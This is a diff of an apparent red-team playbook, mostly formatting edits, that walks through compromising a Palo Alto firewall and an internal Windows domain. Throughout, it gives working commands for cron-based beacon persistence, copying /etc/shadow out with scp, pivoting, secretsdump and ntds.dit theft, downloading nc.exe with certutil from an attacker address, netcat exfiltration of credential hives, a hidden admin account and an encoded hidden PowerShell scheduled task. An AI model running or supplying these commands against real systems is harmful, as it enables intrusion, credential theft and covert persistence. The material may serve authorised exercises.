@@ -85,7 +85,7 @@ sudo nano /usr/share/wordlists/rockyou.txt
 - `Ctrl+O`
 - `ctrl+X`
 
-#### PASSWORD LIST:  
+#### PASSWORD LIST:
 
 ```text
 Summer2025
@@ -246,39 +246,42 @@ ls
 
 4. Once you’ve confirmed the script is there, it’s time to set up the cron job to maintain persistence. To add the cron job, execute the following command:
    `(crontab -l 2>/dev/null; echo "* * * * * /usr/bin/python3 /usr/local/bin/pan_os_comm.py >/dev/null 2>&1") | crontab -`
-	NOTE- This will add a cron job that runs every minute, calling your pan_os_comm.py script and sending a beacon to your second listener.
+NOTE- This will add a cron job that runs every minute, calling your pan_os_comm.py script and sending a beacon to your second listener.
 
 5. To check that your cron job has been successfully added, run the following:
    `crontab -l`
-   	NOTE- This should display the current cron jobs, confirming that the job was added. The cron job will send a beacon to your listener every minute, ensuring that even if you lose access, you can reopen the listener using the same port, and it will catch the beacon again.
+NOTE- This should display the current cron jobs, confirming that the job was added. The cron job will send a beacon to your listener every minute, ensuring that even if you lose access, you can reopen the listener using the same port, and it will catch the beacon again.
 
 ## Phase 3: Enumeration and Exfil
 
 Now that we have a way to return to the system, let’s gather critical files containing sensitive data, which can be exfiltrated and reviewed offline for password cracking.
 
 1. We’ll start by viewing some important files and saving them to a new document for exfiltration:
-   ```
-   cat /etc/passwd > users.txt
-   cat /etc/shadow >> users.txt  # Notice the '>>', it appends the content of /etc/shadow
-   cat /etc/hosts >> users.txt   # Append /etc/hosts to the same file
 
-   ```
-   NOTE: The >> operator ensures that the contents of /etc/shadow and /etc/hosts are appended to users.txt. If you use >, the file will be overwritten.
+```bash
+cat /etc/passwd > users.txt
+cat /etc/shadow >> users.txt  # Notice the '>>', it appends the content of /etc/shadow
+cat /etc/hosts >> users.txt   # Append /etc/hosts to the same file
+```
 
-2. Next, use SCP to securely copy the users.txt file to your attack machine:
+NOTE: The `>>` operator ensures that the contents of `/etc/shadow` and `/etc/hosts` are appended to `users.txt`. **If you use** `>`, **the file will be overwritten.**
+
+2. Next, use `SCP` to securely copy the `users.txt` file to your attack machine:
    `scp users.txt kali@<your_ip_address>:.`
-	NOTE: Make sure to replace <your_ip_address> with the actual IP address of your attack machine, and specify the path where you want the file to be saved.
+NOTE: Make sure to replace <your_ip_address> with the actual IP address of your attack machine, and specify the path where you want the file to be saved.
 
 3. On your attack machine, open a new terminal, navigate to your home folder, and check if the file has been transferred successfully:
-   ```
-   cd ~
-   ls | grep users.txt
-   ```
+
+```bash
+cd ~
+ls | grep users.txt
+```
+
 4. Once you’ve confirmed that the file has been successfully transferred, you can exit the compromised machine. Your beacon terminal should still be active, allowing you to regain access at any time.
    `exit`
 
-
 ## Phase 4: Privilege Escalation
+
 In this section, we will leverage the exfiltrated users.txt file that was pulled from the Palo Alto system. We will perform offline password cracking to gain legitimate credentials for the device.
 
 1. First, verify that you’re in the correct directory where users.txt is located. You can search for the file and navigate to it with the following commands: `find / -name "users.txt"`
@@ -292,10 +295,10 @@ In this section, we will leverage the exfiltrated users.txt file that was pulled
 5. Using the cracked administrator credentials, you can now log into the Palo Alto device via SSH: `ssh admin@<palo_ip>`
    When prompted, enter the cracked password. If successful, you should be logged into the Palo Alto device.
 
-
-
 ## Phase 5: Internal Reconnaissance & Enumeration
+
 Once inside the firewall OS:
+
 ### Identify internal interfaces and routes
 
 ```bash
@@ -311,13 +314,16 @@ cat /config/config.xml | grep -i 'mgmt\|admin\|ldap\|radius'
 ```
 
 #### Attempt to pivot through firewall if routing/NAT is enabled
-- sshuttle/reverse SOCKS proxy (chisel, socat) to tunnel traffic into the internal 
+
+- sshuttle/reverse SOCKS proxy (chisel, socat) to tunnel traffic into the internal
 network.
 
-
 ## Phase 6: Target Discovery Inside Orange Space
+
 Assuming pivot success to internal hosts:
+
 #### Scan internal subnets for DC or LDAP
+
 ```bash
 nmap -p 389,445,88,135,139,389,636,3268,3269 -sV -Pn 172.20.0.0/16
 ```
@@ -325,45 +331,62 @@ nmap -p 389,445,88,135,139,389,636,3268,3269 -sV -Pn 172.20.0.0/16
 - Look for the Domain Controller (likely in orange-servers or orange-users).
 
 ## Phase 7: Credential Access (via LDAP, SAM/NTDS)
+
 - Once a DC is identified (e.g., 172.20.2.X), you can:
-	- 88, 389
+ 	- `88`, `389`
 - Enumerate via LDAP (LOLBAS):
+
 ```bash
 ldapsearch -x -h 172.20.2.X -b "dc=orange,dc=local"
 ```
+
 If admin rights are obtained, dump credentials:
+
 1. Use secretsdump from Impacket
+
 ```bash
 impacket-secretsdump 'orange.local/adminuser:password@172.20.2.X'
 ```
+
 2. If on host with NTDS.dit access:
-	Copy ntds.dit and SYSTEM hive for offline cracking
+Copy ntds.dit and SYSTEM hive for offline cracking
+
 ```bash
 copy C:\Windows\NTDS\ntds.dit D:\stolen\
 reg save hklm\system D:\stolen\system.hiv
 ```
+
 Transfer those over SMB/certutil:
+
 ```bash
 certutil -urlcache -f http://<attacker_ip>/nc.exe nc.exe
 nc.exe <attacker_ip> 4444 < ntds.dit
 nc.exe <attacker_ip> 4445 < system.hiv
 ```
+
 Then parse locally:
+
 ```bash
 secretsdump.py -ntds ntds.dit -system system.hiv LOCAL
 ```
+
 ## Phase 8: Lateral Movement and Persistence
+
 Use Admin Shares:
+
 ```bash
 wmic /node:172.20.0.X process call create "cmd.exe /c whoami"
 psexec.py orange.local/adminuser@172.20.0.X
 ```
-### Create a hidden user (LOLBAS):
+
+### Create a hidden user (LOLBAS)
+
 ```bash
 net user stealthyUser P@ssw0rd! /add
 net localgroup administrators stealthyUser /add
 ```
-### Persist via Scheduled Task or Service:
+
+### Persist via Scheduled Task or Service
 
 ```bash
 schtasks /create /tn "Updater" /tr "powershell -NoP -NonI -W Hidden -Enc <payload>" /sc minute /mo 15
